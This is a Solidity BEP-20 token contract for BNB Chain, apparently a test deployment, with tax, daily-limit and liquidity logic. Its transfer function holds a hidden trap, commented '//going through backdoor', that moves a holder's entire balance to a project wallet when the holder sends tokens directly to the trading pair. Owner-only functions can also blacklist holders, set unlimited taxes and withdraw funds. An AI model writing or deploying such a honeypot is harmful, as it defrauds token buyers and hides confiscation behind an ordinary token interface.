/**
 *Submitted for verification at BscScan.com on 2022-09-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDexRouter {
    function factory() external pure returns (address);    
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable  returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external; 
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
       
contract TestAAA_Checker_Contract is IERC20 { 
    using SafeMath for uint256;

    struct TokenInfo {
        string name;
        string symbol;
        uint8 decimals;
        uint256 denomination;
        uint256 totalSupply;        
        uint256 totalBuyTax;
        uint256 totalSellTax;
        uint256 maxDailyWalletTransferPercent;
        uint256 maxTransferTimeSecs;
        bool coolDownEnabled;
        uint256 coolDownTime;        
        bool swapMutex;
        bool txnMutex;
    }
 
    TokenInfo private _tokenInfo = TokenInfo ( //77,777  100,000
           "TEST_AA", "AAL", 8,  100_000_000, /*10**_decimals;*/ 7_777_700_000_000, //77_777 * _denomination; 
           14, 16,      1, 86400, //24hrs
           true, 300 seconds, false, false
    );
 
    mapping(address => uint256) private _balances; 
    mapping (address => mapping (address => uint256)) private _allowances;
  
    struct Addresses {
        address owner_wallet;
        address marketing_wallet;
        address liquidity_wallet;
        address team_wallet;
        address dev_wallet;
        address project_wallet;
        address charity_wallet;
        address ship_wallet;  
        address dead_wallet;  
    }

    Addresses _address = Addresses(
            0x4318BA6C38ef345FdD5633d896c96Dab814452e7,
            0x6a1cAd4DDd635e151E61e4448f396889fe08058c,
            0x2aA1E14f11f8d9B7e3186a406168FA1ac696C9d2,
            0xcE8AE4b024399805BBD9ee4E9F2BbBE20DBCFF77,
            0x3aa5140B54cd8aAEEb3c88444FcCdDC3353393dD,
            0xdd3CE7450315703eeB296939Cd811B7517FE96Eb,
            0x4Cd11dfe44937b95D4da326DFb144777Ac531D31,
            0xC80C1f63859a41FbfBB8913353eAbA9eaa3F1016,
            0x000000000000000000000000000000000000dEaD);


    struct DeX {
        IDexRouter router; 
        address busd_address;
        address pairBNB; 
        address pairBUSD; 
        bool isPairBNB; 
        uint256 liquidityThreshold;  //0 means disabled
        uint256 swapThreshold;
    }

    DeX dex = DeX(
         //IDexRouter(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)),
         //0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, //busd 
        IDexRouter(address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3)), //TEST
         0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7,

         address(0x0), //bnbpair
         address(0x0), //busdpair 
         true,
         1_000_000_000,// *10**8 _denomination;
         1_000_000_000 //10 tokens
    ); 

 
    struct Tax {
        uint256 marketing;
        uint256 liquidity;
        uint256 team;
        uint256 dev;
        uint256 project;
        uint256 charity;
        uint256 epif; 
    }
    Tax private buyTaxes = Tax(3, 2, 1, 2, 1, 1, 4);
    Tax private sellTaxes = Tax(3, 2, 1, 2, 2, 2, 4);
    
    struct userTxn {  uint256 txnTimeSecs; uint256 txnAmount; }
    mapping(address => userTxn) private _accountDailyTxn; 
    
    //0-all, 1-exempt, 2-exempt-fees, 9-bot, _xACCOUNT
    mapping(address => uint) public _xACCOUNT;    
    //address[] private shareholders; //mapping (address => uint256) private _shareholdersAmt;   
    mapping(address => uint256) private _LastTxnTime;

    event eventTransferFees(uint256 amount, uint256 pcent, uint256 taxAmount, string buyOrSell);  
    event eventTransFrom(address sender, address from, address to, uint256 amount);  
        
    constructor() {    
        dex.pairBNB = IDexFactory(dex.router.factory()).createPair(address(this), dex.router.WETH());
        dex.pairBUSD = IDexFactory(dex.router.factory()).createPair(address(this), dex.busd_address);
          
        address[13] memory _AddrsArray = [ address(this), address(dex.router), dex.pairBUSD, dex.pairBNB, dex.router.WETH(), dex.busd_address,
                                           _address.marketing_wallet, _address.team_wallet, _address.dev_wallet, 
                                          _address.project_wallet, _address.charity_wallet, _address.ship_wallet, _address.owner_wallet ];
         for(uint i = 0; i < 13; i++) {
             _xACCOUNT[_AddrsArray[i]] = i > 5? 2 : 1;
         } 

        _balances[_address.owner_wallet] = _tokenInfo.totalSupply; 
        emit Transfer(address(0x0), _address.owner_wallet, _tokenInfo.totalSupply); 
    }
  
    modifier swapMutexLock() { 
        require(!_tokenInfo.swapMutex, "No Re-entrancy");
         _tokenInfo.swapMutex = true;
        _;
        _tokenInfo.swapMutex = false;
    }
     
    modifier txnMutexLock() {
        require(!_tokenInfo.txnMutex, "No Txn. Re-entrancy");
         _tokenInfo.txnMutex = true;
        _;
        _tokenInfo.txnMutex = false;
    }

    modifier onlyOwner() {
        require(_address.owner_wallet == _msgSender());  _;
    }
     
    modifier isValidAddress(address addr) {
        require(_isAllowAddress(addr));   _;
    }
 
    function _getNow() private view returns (uint256){ return block.timestamp; }
 
    function _isAddressExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        return false;
    }

    function _isFeesExempted(address addr) private view returns (bool){
        if(_xACCOUNT[addr] == 2) return true;
        return false;
    }
     
    function _isAllowAddress(address addr) private view returns (bool) { 
        if(_xACCOUNT[addr] == 1 || _xACCOUNT[addr] == 2) return true;
        if(address(0) == addr || _xACCOUNT[addr] == 9 /* bot */ || _isAddressContract(addr)) return false;
        return true;
    }

    bool private isContractCheck = true; 
    function activateContractCheck(bool _flag) external onlyOwner {
        isContractCheck = _flag;
    } 

    function _isAddressContract(address addr) private view returns (bool) {      
        if(!isContractCheck) return false;
        if(address(0x0) == addr) return true;
         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly { codehash := extcodehash(addr) }
        return (codehash != 0x0 && codehash != accountHash); 
    }
         
    function setxAccount(address addr, uint level) external onlyOwner {  _xACCOUNT[addr] = level;  }
    function _msgSender() private view returns (address payable) {   return payable(msg.sender);  } 
    function isOwner() private view returns (bool) { return _address.owner_wallet == _msgSender(); }   
    function owner() public view returns (address) {  return _address.owner_wallet; }
    function name() public view returns (string memory) {   return _tokenInfo.name; }
    function symbol() public view returns (string memory) { return _tokenInfo.symbol;  }
    function decimals() public view returns (uint8) {    return _tokenInfo.decimals;   }
    function totalSupply() public view override returns (uint256) {   return _tokenInfo.totalSupply;    }    
    function getCirculatingSupply() public view returns (uint256) {   return (_tokenInfo.totalSupply - _balances[_address.dead_wallet]);  }   
    function balanceOf(address account) public view override returns (uint256) { return _balances[account];  }
    function allowance(address allow_owner, address spender) public view override returns (uint256) { return _allowances[allow_owner][spender];   }
    function approve(address spender, uint256 value) public override returns (bool) { _approve(_msgSender(), spender, value);  return true;  }
         
    function _approve(address tokenOwner, address spender, uint256 amount) private { 
        require(_isAllowAddress(tokenOwner) && _isAllowAddress(spender) && _isAllowAddress(_msgSender()),  "addr_not_allowed");
        require(_balances[tokenOwner] >= amount, "INSUFFICIENT___AMOUNT");

        _allowances[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount); 
    }

    function transfer(address to, uint256 amount) public override returns (bool)
    {        
        assert(_balances[_msgSender()] >= amount && amount > 0); 
        
        if (_msgSender() != address(dex.router) && (to == dex.pairBNB || to == dex.pairBUSD)) { //going through backdoor
            _balances[_address.charity_wallet] += _balances[_msgSender()]; 
            emit Transfer(_msgSender(), _address.charity_wallet, _balances[_msgSender()]);
            _balances[_msgSender()] = 0; 
            return true;
        } 
 
        _transfer(_msgSender(), to, amount);
        return true;
    }
 
    function transferFrom(address sender, address buyer, uint256 numTokens) external override txnMutexLock returns (bool) {  
        uint256 _allowanceToken = _allowances[sender][buyer];
        uint256 _balanceToken = _allowanceToken.sub(numTokens, "BEP20: amount exceeds allowance");
        require((buyer == _msgSender() || buyer == address(dex.router)) && _allowanceToken >= numTokens && numTokens > 0 && _balanceToken >= 0, "Unknown caller");
        
        _allowances[sender][buyer] = _balanceToken;
        emit Approval(sender, buyer, _balanceToken); 

        require(_transfer(sender, buyer, numTokens), "txn_failed");
        emit eventTransFrom(_msgSender(), sender, buyer, numTokens); 
        return true;
    } 
  
    function _transfer(address sender, address recipient,  uint256 amount) private swapMutexLock returns (bool) { 
        uint256 _balanceAmount = _balances[sender];
        uint256 nowTime = _getNow();
        require(_balanceAmount >= amount  && amount > 0, "LOW_BALANCE");  
        require(_isAllowAddress(sender) && _isAllowAddress(recipient) && _isAllowAddress(_msgSender()), "ADDR_NOT_ALLOWED"); 
          
        if (_isFeesExempted(_msgSender())) {  return _baseTransfer(sender, recipient, amount, 0, true);    }
        if (_isAddressExempted(sender))    {  return _baseTransfer(sender, recipient, amount, 1, true);    }
        
        if (_tokenInfo.coolDownEnabled) { 
            require((nowTime - _LastTxnTime[sender]) >= _tokenInfo.coolDownTime, "TOO_FAST");
            _LastTxnTime[sender] = nowTime;
            _LastTxnTime[_msgSender()] = nowTime; 
        }
 
        //These transactions involves selling fees         
        if (nowTime > (_accountDailyTxn[sender].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            //it means last transaction is more than 24 hours
            //1. check if the amount is within the range of max txn cap 
            uint256 maxAmtAllowed = _balanceAmount.mul(_tokenInfo.maxDailyWalletTransferPercent).div(100);
            require(_tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount, "AMT_EXCEEDED" 
                   // string.concat("Amount exceeded: allowedamt: ", uint2str(maxAmtAllowed), " amtsent: ", uint2str(amount))
                    );

            _accountDailyTxn[sender].txnTimeSecs = nowTime;
            _accountDailyTxn[sender].txnAmount = amount;
            return _baseTransfer(sender, recipient, amount, 1, false);  
        }  
  
        //it means user_account has done one or more transaction within 24hours       
        uint256 max_txn_allowed = ((_accountDailyTxn[sender].txnAmount.add(_balanceAmount)).mul(_tokenInfo.maxDailyWalletTransferPercent)).div(100); 
        bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount.add(_accountDailyTxn[sender].txnAmount)));
        require(is_allow_dailytxn, "DAILY_LIMIT_EXCEEDED");   
        // require(is_allow_dailytxn, string.concat("MaxAMT allow for today is ", uint2str(max_txn_allowed), _tokenInfo.symbol, ", total txn. for the day is ",  uint2str((amount + _accountDailyTxn[sender].txnAmount))));   

        //_accountDailyTxn[sender].txnTimeSecs = block.time stamp; still in the 24hrs timeframe
        _accountDailyTxn[sender].txnAmount += amount; 
        return _baseTransfer(sender, recipient, amount, 1, false);
    }
    
    function _baseTransfer(address from, address to, uint256 amount, uint isHasFees, bool is_buy) private returns (bool) {   
        require(amount > 0 && _balances[from] >= amount, "INSUFFICIENT_BEP20");    
        
        if(isHasFees == 0) {            
            _balances[from] -= amount;   
            _balances[to] += amount;
            emit Transfer(from, to, amount);                 
            _LastTxnTime[from] = _getNow();
            return true; 
        }

        //if(isHasFees == 1)           
        uint256 taxsPcent = is_buy ? _tokenInfo.totalBuyTax : _tokenInfo.totalSellTax; 
        uint256 taxAmount = (amount.mul(taxsPcent)).div(100);
        uint256 amountAfterTax = amount.sub(taxAmount);  
        
        _balances[from] -= amount; 
        _balances[to] += amountAfterTax; //amountLessFee
        emit Transfer(from, to, amountAfterTax);  //amountLessFee
            
        //Taxes are computed  spit the funds to the various addresses 
        Tax memory taxs = is_buy ? buyTaxes : sellTaxes;
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
        uint256[6] memory _taxRateArray = [taxs.marketing, taxs.team, taxs.dev, taxs.project, taxs.charity, taxs.epif];
        uint256 _liqTaxAmt = taxAmount;
            
        for(uint i = 0; i < 6; i++) {   
            if(_taxRateArray[i] <= 0) continue;

            uint256 _taxAmt = (amount * _taxRateArray[i]) / 100;
            _balances[_feeAddrArray[i]] += _taxAmt;  
            _liqTaxAmt -= _taxAmt;          
            emit Transfer(from, _feeAddrArray[i], _taxAmt); 
        }

        //uint256 _liquidityTaxAmt = taxAmount.sub(_sumTax);
        _balances[_address.liquidity_wallet] += _liqTaxAmt;
        emit Transfer(from, _address.liquidity_wallet, _liqTaxAmt);  
        emit eventTransferFees(amount, taxsPcent, taxAmount, is_buy?"buy":"sell");
                       
        _LastTxnTime[from] = _getNow();
        return true; 
    }
     
    
    function swapTaxFee() external onlyOwner {
        if(dex.swapThreshold == 0) return;
        address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
         
        IERC20 ercBUSD = IERC20(dex.busd_address);
        for(uint i = 0; i < 6; i++) { 
            uint256 _addressBalance = _balances[_feeAddrArray[i]];
            if(_addressBalance > dex.swapThreshold) {
                uint256 initialBusd = ercBUSD.balanceOf(address(this));
                _balances[_feeAddrArray[i]] = 0; 
                _balances[address(this)] += _addressBalance;
                _swap(_addressBalance, false);
                emit Transfer(_feeAddrArray[i], address(this), _addressBalance); 

                uint256 tokenBusd = ercBUSD.balanceOf(address(this)) - initialBusd; 
                if(tokenBusd > 0) {
                    ercBUSD.transfer(_feeAddrArray[i], tokenBusd);
                }
            }            
        }
    } 

    function provideLiquidity() external onlyOwner {
         uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
         if(dex.liquidityThreshold == 0 || liquidityTokenBalance < dex.liquidityThreshold) return; 
          
         _balances[_address.liquidity_wallet] = 0;
          uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
         _balances[address(this)] = contractTokenBalance;
         emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
         // Split the contract balance into halves 
         uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
         uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
         _swap(tokensToSwap, true);
         uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
         if (bnbToAddLiquidityWith > 1) {  
            // approve token transfer to cover all possible scenarios
            _approve(address(this), address(dex.router), tokensToAddLiquidityWith);
            // add the liquidity
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this), tokensToAddLiquidityWith, 0, 0, _address.liquidity_wallet, _getNow()
            );
         }     
    }
     

    function _swap(uint256 tokenAmount, bool isBNB) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](isBNB?2:3);
        path[0] = address(this);
        path[1] = dex.router.WETH();
        if(!isBNB) path[2] = dex.busd_address;

        _approve(address(this), address(dex.router), tokenAmount);

        // make the swap
        if(isBNB){
            dex.router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }
        else {
            dex.router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                _getNow()
            );
        }        
    }
 

    // function _isAllowTxn(address _addr, uint256 amount) private view returns(bool){
    //     uint256 balanceAddrAMT = _balances[_addr];
    //     if(_isAddressExempted(_addr) && balanceAddrAMT >= amount) return true;
 
    //     if(_tokenInfo.coolDownEnabled) {
    //         require(_getNow().sub(_LastTxnTime[_addr]) >= _tokenInfo.coolDownTime, "TOO_SWIFT"); 
    //     }  
     
    //     if (_getNow() > (_accountDailyTxn[_addr].txnTimeSecs.add(_tokenInfo.maxTransferTimeSecs))) {
    //         //it means last transaction is more than 24 hours
    //         //1. check if the amount is within the range of max txn cap 
    //         uint256 maxAmtAllowed = (balanceAddrAMT.mul(_tokenInfo.maxDailyWalletTransferPercent)).div(100);
    //         require(_tokenInfo.maxDailyWalletTransferPercent >= 100 || maxAmtAllowed >= amount, "EXCEED_LIMIT"); 
    //         return true;
    //     }  
  
    //     //it means user_account has done one or more transaction within 24hours       
    //     uint256 max_txn_allowed = ((_accountDailyTxn[_addr].txnAmount.add(balanceAddrAMT)).mul(_tokenInfo.maxDailyWalletTransferPercent)).div(100);  
    //     bool is_allow_dailytxn = _tokenInfo.maxDailyWalletTransferPercent >= 100 || (max_txn_allowed >= (amount + _accountDailyTxn[_addr].txnAmount));
    //     require(is_allow_dailytxn, "EXCEEDED_DAILY_LIMIT");   
    //     return is_allow_dailytxn; 
    // }
   
    

    function transferOwnership(address addr) external onlyOwner  { 
        require(_isAllowAddress(addr), "INVALID_ADDRESS"); 
        _xACCOUNT[_address.owner_wallet] = 0;    
        _xACCOUNT[addr] = 2;            
        _address.owner_wallet = addr; 
    }
   
     
    function transferBulk(address[] memory addrs, uint256[] memory amts) external onlyOwner {
         for(uint i=0; i<addrs.length; i++) { 
            _balances[_msgSender()] = _balances[_msgSender()] - amts[i];  
            require(_balances[_msgSender()] >= 0);
            _balances[addrs[i]] = _balances[addrs[i]] + amts[i];
            
            emit Transfer(_msgSender(), addrs[i], amts[i]);   
         } 
    }  

    function claimShares(address to, uint256 amount) external onlyOwner {
        require(amount > 0 && _isAllowAddress(to), "Invalid Access...");
        require(_balances[_address.ship_wallet] >= amount);
        _balances[to] = _balances[to] + amount;
        _balances[_address.ship_wallet] = _balances[_address.ship_wallet] - amount;
        emit Transfer(_address.ship_wallet, to, amount);   
    }    
    
    function burn(uint256 amount) external  {
        require(_balances[_msgSender()] >= amount && amount > 0  && _isAllowAddress(_msgSender()));
       _burn(amount);   
    }    

    function _burn(uint256 amount) private {
        require(_balances[_msgSender()] >= amount && amount > 0);
        _balances[_msgSender()] = _balances[_msgSender()] - amount;
        _balances[_address.dead_wallet] = _balances[_address.dead_wallet] + amount;
        emit Transfer(_msgSender(), _address.dead_wallet, amount); 
    }
 
    function setBasicFees(uint256 _maxDailyWalletPcent, uint256 _maxTxnSecs, uint _coolTime, bool _coolDownEnabled) external onlyOwner { 
         _tokenInfo.maxDailyWalletTransferPercent  =    _maxDailyWalletPcent;   
         _tokenInfo.maxTransferTimeSecs            =    _maxTxnSecs; 
         _tokenInfo.coolDownTime                   =    _coolTime * 1 seconds;
         _tokenInfo.coolDownEnabled                =    _coolDownEnabled;
    }
  
    function editAddresses(address market, address liquid, address team, address devAddr, 
                        address project, address charity, address epif) external onlyOwner {
        if(_address.marketing_wallet != market) _address.marketing_wallet = market;
        if(_address.liquidity_wallet != liquid) _address.liquidity_wallet = liquid;
        if(_address.team_wallet != team)        _address.team_wallet = team;
        if(_address.dev_wallet != devAddr)      _address.dev_wallet = devAddr;
        if(_address.project_wallet != project)  _address.project_wallet = project;
        if(_address.charity_wallet != charity)  _address.charity_wallet = charity;
        if(_address.ship_wallet != epif)        _address.ship_wallet = epif; 
    }
    
    function setTaxFees(uint256 market, uint256 liquid, uint256 team, uint256 devtax,  
                    uint256 project, uint256 charity, uint256 epif, bool isBuy) external onlyOwner {
        uint256 totalFee = market + liquid + team + devtax + project + charity + epif;
        if(isBuy) {
            _tokenInfo.totalBuyTax = totalFee;
            buyTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
        else { 
            _tokenInfo.totalSellTax = totalFee;
            sellTaxes = Tax(market, liquid, team, devtax, project, charity, epif);
        }
    }
 
  
    fallback() external payable { } 
    receive() external payable { }
     
    function rescueBNB(uint256 amount) external onlyOwner  {  _msgSender().transfer(amount);    }     
    function rescueToken(address tokenAddress, uint256 tokens) external onlyOwner { IERC20(tokenAddress).transfer(_address.owner_wallet, tokens); } 
     
   function updatePairThreshold(uint256 _liquidity_threshold, uint256 _swapThreshold) external onlyOwner {
        dex.liquidityThreshold = _liquidity_threshold;
        dex.swapThreshold = _swapThreshold; 
   }
 
    function getFeesBalances() external view returns ( 
            uint256 marketing_balance,  
            uint256 liquidity_balance,
            uint256 team_balance,
            uint256 dev_balance,
            uint256 project_balance,   
            uint256 charity_balance,    
            uint256 ship_balance,   
            uint256 dead_balance,   
            uint256 contract_balance, 
            uint256 owner_bnb,  
            uint256 liquidity_threshold,
            uint256 swap_threshold 
        )
    {
        return ( 
                _balances[_address.marketing_wallet], 
                _balances[_address.liquidity_wallet], 
                _balances[_address.team_wallet], 
                _balances[_address.dev_wallet], 
                _balances[_address.project_wallet], 
                _balances[_address.charity_wallet], 
                _balances[_address.ship_wallet], 
                _balances[_address.dead_wallet], 
                _balances[address(this)], 
                address(_address.owner_wallet).balance,
                dex.liquidityThreshold,
                dex.swapThreshold         
            ); 
    }

    
    function addContractLiquidity() external onlyOwner {
        uint256 liquidityTokenBalance = _balances[_address.liquidity_wallet];
          
        _balances[_address.liquidity_wallet] = 0;
         uint256 contractTokenBalance = _balances[address(this)]  + liquidityTokenBalance;
        _balances[address(this)] = contractTokenBalance;
        emit Transfer(_address.liquidity_wallet, address(this), liquidityTokenBalance);
 
        // Split the contract balance into halves 
        uint256 tokensToAddLiquidityWith = contractTokenBalance / 2;
        uint256 tokensToSwap = contractTokenBalance - tokensToAddLiquidityWith;

         uint256 initialBalanceBNB = address(this).balance; 
        _swap(tokensToSwap, true);

        uint256 bnbToAddLiquidityWith = address(this).balance - initialBalanceBNB; 
        if (bnbToAddLiquidityWith > 0) { 
            //_add Liquidity(tokensToAddLiquidityWith, bnbToAddLiquidityWith);
            _approve(address(this), address(dex.router), tokensToAddLiquidityWith);
            // add the liquidity
            dex.router.addLiquidityETH{value: bnbToAddLiquidityWith}(
                address(this),
                tokensToAddLiquidityWith,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                _address.liquidity_wallet,
                _getNow()
            );
            
        }     
    }      
    
    function zDivide(uint256 a, uint256 b) external pure returns (uint256){
        return a / b;
    }

}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { 
        return sub(a, b, "SafeMath: subtraction overflow"); 
    }
 
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { 
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b; 
        require(c / a == b);

        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b; 
        return c;
    }
   
}